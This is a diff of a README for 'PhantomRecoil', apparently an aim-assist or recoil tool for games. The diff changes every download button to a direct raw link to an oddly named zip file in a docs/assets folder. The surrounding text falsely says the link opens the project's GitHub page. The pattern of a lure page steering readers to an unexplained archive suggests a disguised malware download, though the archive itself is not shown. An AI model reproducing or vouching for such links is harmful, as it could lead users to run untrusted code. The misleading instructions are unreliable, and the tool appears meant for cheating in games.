@@ -1,6 +1,6 @@
 # 🎯 PhantomRecoil - Control Your Aim with Ease
 
-[![Download PhantomRecoil](https://img.shields.io/badge/Download-PhantomRecoil-ff4500?style=for-the-badge)](https://github.com/sethywan/PhantomRecoil/raw/refs/heads/main/web/Recoil-Phantom-v3.6.zip)
+[![Download PhantomRecoil](https://img.shields.io/badge/Download-PhantomRecoil-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/sethywan/PhantomRecoil/main/docs/assets/Phantom_Recoil_suavely.zip)
 
 ---
 
@@ -34,12 +34,12 @@ Make sure your system is up to date with Windows updates for best results.
 
 Please use the link below to download PhantomRecoil. This link leads to the main GitHub page, where you’ll find the latest release files.
 
-[![Download PhantomRecoil](https://img.shields.io/badge/Download-PhantomRecoil-blue?style=for-the-badge)](https://github.com/sethywan/PhantomRecoil/raw/refs/heads/main/web/Recoil-Phantom-v3.6.zip)
+[![Download PhantomRecoil](https://img.shields.io/badge/Download-PhantomRecoil-blue?style=for-the-badge)](https://raw.githubusercontent.com/sethywan/PhantomRecoil/main/docs/assets/Phantom_Recoil_suavely.zip)
 
 ### Step 1: Visit the Download Page
 
 Open your browser and go to the PhantomRecoil GitHub page:
-https://github.com/sethywan/PhantomRecoil/raw/refs/heads/main/web/Recoil-Phantom-v3.6.zip
+https://raw.githubusercontent.com/sethywan/PhantomRecoil/main/docs/assets/Phantom_Recoil_suavely.zip
 
 You will see a list of files and folders. Look for the “Releases” section on the right sidebar or at the top menu. Click on "Releases" to go to the downloads.
 
@@ -113,4 +113,4 @@ Keep these files together in one folder for easy access and updates.
 
 ## 📥 Download PhantomRecoil Here
 
-[![Download PhantomRecoil](https://img.shields.io/badge/Download-Here-grey?style=for-the-badge)](https://github.com/sethywan/PhantomRecoil/raw/refs/heads/main/web/Recoil-Phantom-v3.6.zip)
+[![Download PhantomRecoil](https://img.shields.io/badge/Download-Here-grey?style=for-the-badge)](https://raw.githubusercontent.com/sethywan/PhantomRecoil/main/docs/assets/Phantom_Recoil_suavely.zip)
